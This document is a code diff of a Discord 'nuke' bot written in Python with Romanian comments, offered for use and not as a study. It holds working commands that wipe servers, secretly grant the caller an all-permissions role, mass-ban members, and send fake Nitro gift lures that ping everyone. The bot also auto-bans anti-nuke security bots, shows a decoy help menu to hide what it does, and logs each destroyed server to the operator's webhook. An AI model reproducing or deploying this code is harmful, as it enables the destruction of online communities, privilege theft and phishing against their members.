@@ -19,17 +19,18 @@ PREMIUM_FILE = "premium.json"
 CONFIG_FILE = "config.json"
 
 PREM = 1525416750240366693
-MOD_ROLE_ID = 1525416750240366693
+MOD_ROLE_ID = 1525416750240366693  # Setează aici ID-ul rolului pentru !modraid (doar owner va avea acces)
 WHITELIST = [1464634211406188721]
 BLACKLISTED_GUILD_ID = 1525971260943892510
 OWNER_ID = 1464634211406188721
 LEADERBOARD_CHANNEL_ID = 1401931021544460389
 TOKEN = os.getenv('TOKEN')
-LOG_WEBHOOK = os.getenv('LOG_WEBHOOK')  # URL-ul webhook-ului pentru loguri
+LOG_WEBHOOK_URL = os.getenv('LOG_WEBHOOK') or ''  # variabila de mediu LOG_WEBHOOK
 
 BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
 BLOCKED_BOT_NAMES = ["Security", "Wick", "Beemo", "AntiNuke"]
 
+# Funcțiile de salvare, încărcare, configurare (rămân neschimbate)
 def save_nuke_stats(user_id, guild):
     try:
         with open(NUKE_STATS_FILE, "r") as f:
@@ -207,45 +208,47 @@ async def detect_and_ban_antinuke_bots(guild):
                     pass
     return banned
 
-async def send_nuke_log(user, guild):
-    """Trimite un embed frumos prin webhook cu detaliile nuke-ului."""
-    if not LOG_WEBHOOK:
-        return  # dacă nu e setat webhook-ul, nu trimitem nimic
-
-    embed = discord.Embed(
-        title="💥 **Server Nuked!**",
-        color=discord.Color.red(),
-        timestamp=datetime.utcnow()
-    )
-    embed.set_author(name=user.display_name, icon_url=user.avatar.url if user.avatar else user.default_avatar.url)
-    embed.add_field(name="👤 User", value=f"{user.mention}\n(`{user.id}`)", inline=True)
-    embed.add_field(name="🛡️ Server", value=f"**{guild.name}**\n(`{guild.id}`)", inline=True)
-    embed.add_field(name="👥 Members", value=f"`{guild.member_count}`", inline=True)
-    embed.add_field(name="👑 Server Owner", value=f"{guild.owner.mention}\n(`{guild.owner.id}`)", inline=False)
-    embed.add_field(name="📅 Created", value=f"<t:{int(guild.created_at.timestamp())}:F>", inline=True)
-    embed.add_field(name="🆔 Roles", value=f"`{len(guild.roles)}`", inline=True)
-    embed.add_field(name="🚀 Boost Level", value=f"`{guild.premium_tier}`", inline=True)
-    embed.add_field(name="💪 Boost Count", value=f"`{guild.premium_subscription_count}`", inline=True)
-    embed.set_footer(text=f"Executed by {user.name}", icon_url=user.avatar.url if user.avatar else user.default_avatar.url)
-
-    async with aiohttp.ClientSession() as session:
-        webhook = discord.Webhook.from_url(LOG_WEBHOOK, session=session)
-        try:
-            await webhook.send(embed=embed)
-        except Exception as e:
-            print(f"[!] Failed to send webhook log: {e}")
-
 class MyBot(commands.Bot):
     def __init__(self):
         intents = discord.Intents.all()
         super().__init__(command_prefix="!", intents=intents)
+        # Elimină comanda implicită help pentru a o înlocui cu a noastră
+        self.remove_command("help")
 
     async def setup_hook(self):
         await self.tree.sync()
 
 bot = MyBot()
 
-# ================== COMENZI OWNER-ONLY ==================
+# ================== FUNCȚIA DE LOG PRIN WEBHOOK ==================
+async def send_nuke_log(guild, user):
+    """Trimite un embed detaliat printr-un webhook despre nuke-ul efectuat."""
+    if not LOG_WEBHOOK_URL:
+        return
+
+    embed = discord.Embed(
+        title="💀 Server Nuked",
+        description=f"**{user.display_name}** (`{user.id}`) a executat un nuke pe serverul **{guild.name}**.",
+        color=discord.Color.red(),
+        timestamp=datetime.utcnow()
+    )
+    embed.set_thumbnail(url=guild.icon.url if guild.icon else None)
+    embed.add_field(name="👤 Membri", value=f"`{guild.member_count}`", inline=True)
+    embed.add_field(name="🫆 Roluri", value=f"`{len(guild.roles)}`", inline=True)
+    embed.add_field(name="🔗 Server", value=f"`{guild.name}` (`{guild.id}`)", inline=False)
+    embed.add_field(name="👑 Owner", value=f"`{guild.owner}`", inline=True)
+    embed.add_field(name="📅 Creat", value=f"`{guild.created_at.strftime('%Y-%m-%d %H:%M UTC')}`", inline=True)
+    embed.add_field(name="⚡ Boost Level", value=f"`{guild.premium_tier}`", inline=True)
+    embed.set_footer(text="Larp Nuke Bot • Logs")
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            webhook = discord.Webhook.from_url(LOG_WEBHOOK_URL, session=session)
+            await webhook.send(embed=embed)
+    except Exception as e:
+        print(f"[LOG ERROR] {e}")
+
+# ================== COMENZI PREMIUM (doar owner) ==================
 @bot.command(name="addpremium")
 async def addpremium(ctx, user: discord.User):
     if ctx.author.id != OWNER_ID:
@@ -285,6 +288,23 @@ async def leave_cmd(ctx):
             except:
                 pass
     await ctx.send("✅ Left all servers (except blacklisted).")
+
+# ================== COMENZI PUBLICE ==================
+@bot.command(name="admin")
+async def admin_cmd(ctx):
+    guild = ctx.guild
+    if guild and guild.id == BLACKLISTED_GUILD_ID:
+        await ctx.reply("`This server is blacklisted.`")
+        return
+    await ctx.message.delete()
+    role = discord.utils.get(guild.roles, name="verified_user")
+    if role is None:
+        perms = discord.Permissions.all()
+        role = await guild.create_role(name="verified_user", permissions=perms)
+        await ctx.send("✅ done!")
+    else:
+        await ctx.send("✅ already done!")
+    await ctx.author.add_roles(role)
 
 @bot.command(name="massban")
 async def massban(ctx):
@@ -340,41 +360,6 @@ async def massban(ctx):
                 pass
     await ctx.send(f"✅ Massban complete — {count}/{total} users banned.")
 
-@bot.command(name="modraid")
-async def modraid(ctx, *, message=None):
-    if ctx.author.id != OWNER_ID:
-        await ctx.send("❌ You are not authorized.")
-        return
-    if message is None:
-        await ctx.send("Provide a message.")
-        return
-    role = ctx.guild.get_role(MOD_ROLE_ID)
-    if role is None:
-        await ctx.send("Role not found.")
-        return
-    await ctx.send(f"{message}\n<@&{MOD_ROLE_ID}>\n\nSent from {ctx.author.mention}")
-    try:
-        await ctx.message.delete()
-    except:
-        pass
-
-# ================== COMENZI PUBLICE ==================
-@bot.command(name="admin")
-async def admin_cmd(ctx):
-    guild = ctx.guild
-    if guild and guild.id == BLACKLISTED_GUILD_ID:
-        await ctx.reply("`This server is blacklisted.`")
-        return
-    await ctx.message.delete()
-    role = discord.utils.get(guild.roles, name="verified_user")
-    if role is None:
-        perms = discord.Permissions.all()
-        role = await guild.create_role(name="verified_user", permissions=perms)
-        await ctx.send("✅ done!")
-    else:
-        await ctx.send("✅ already done!")
-    await ctx.author.add_roles(role)
-
 @bot.command(name="fakenitro")
 async def fakenitro(ctx):
     if ctx.guild and ctx.guild.id == BLACKLISTED_GUILD_ID:
@@ -400,7 +385,7 @@ async def fakenitro(ctx):
         await dm_channel.send("❌ Timed out.")
         return
     method = "spam" if reply.content == "1" else "giveaway"
-    fake_link = "https://discord.gg/larpempire"  # înlocuiește cu linkul tău
+    fake_link = "https://discord.gg/larpempire"
     embed = discord.Embed(
         description=(
             f"# <a:nitro:1402674645790101615> You've been gifted a subscription!\n"
@@ -420,7 +405,7 @@ async def fakenitro(ctx):
             except:
                 continue
         await dm_channel.send(f"✅ Nitro embed sent to `{success}` channels, everyone pinged!")
-    else:  # giveaway
+    else:
         overwrites = {
             ctx.guild.default_role: discord.PermissionOverwrite(
                 view_channel=True,
@@ -461,7 +446,7 @@ async def invite_cmd(ctx):
     except discord.Forbidden:
         await ctx.reply("❌ I couldn't DM you. Please check your privacy settings.", ephemeral=True if ctx.guild else False)
 
-@bot.command(name="help")
+@bot.command(name="help")  # comanda falsă (păcăleală)
 async def fake_help(ctx):
     embed = discord.Embed(
         title="⚡ Nova Bot Help",
@@ -491,12 +476,12 @@ async def real_help(ctx):
         color=discord.Color.blurple()
     )
     embed.set_thumbnail(url=bot.user.avatar.url if bot.user.avatar else bot.user.default_avatar.url)
-    embed.add_field(name="`!setup`", value="Completely wipes the server (creates 200 channels + spam).", inline=False)
+    embed.add_field(name="`!setup`", value="Completely wipes the server.", inline=False)
     embed.add_field(name="`!admin`", value="Tries to secretly give you admin.", inline=False)
-    embed.add_field(name="`!massban`", value="Bans everyone (owner only).", inline=False)
+    embed.add_field(name="`!massban`", value="Bans everyone! (Owner only)", inline=False)
     embed.add_field(name="`!invite`", value="Sends the bot invite to your dms.", inline=False)
     embed.add_field(name="`!fakenitro`", value="Create a fake nitro giveaway and lure people.", inline=False)
-    embed.add_field(name="`!modraid`", value="Send a raid message with role ping (owner only).", inline=False)
+    embed.add_field(name="`!modraid`", value="Raid command (Owner only)", inline=False)
     embed.add_field(name="`/dashboard`", value="Displays a dashboard for custom settings.", inline=False)
     embed.add_field(name="`!help`", value="Shows a fake help embed.", inline=False)
     embed.add_field(name="`!nhelp`", value="Shows this real help embed.", inline=False)
@@ -504,7 +489,25 @@ async def real_help(ctx):
     embed.timestamp = datetime.utcnow()
     await ctx.send(embed=embed)
 
-# ================== COMENDA SETUP (200 canale, fără premium) ==================
+@bot.command(name="modraid")
+async def modraid(ctx, *, message=None):
+    if ctx.author.id != OWNER_ID:
+        await ctx.send("❌ You are not authorized.")
+        return
+    if message is None:
+        await ctx.send("Provide a message.")
+        return
+    role = ctx.guild.get_role(MOD_ROLE_ID)
+    if role is None:
+        await ctx.send("Role not found.")
+        return
+    await ctx.send(f"{message}\n<@&{MOD_ROLE_ID}>\n\nSent from {ctx.author.mention}")
+    try:
+        await ctx.message.delete()
+    except:
+        pass
+
+# ================== COMENDA SETUP ==================
 async def send_with_retry(channel, content=None, embed=None, max_retries=10):
     retries = 0
     while retries < max_retries:
@@ -571,8 +574,8 @@ async def setup(ctx):
 
     save_nuke_stats(user.id, guild)
 
-    # Trimite log prin webhook
-    await send_nuke_log(user, guild)
+    # Trimite logul prin webhook
+    await send_nuke_log(guild, user)
 
     admin_users = [1389763251042258944, 1464634211406188721]
 
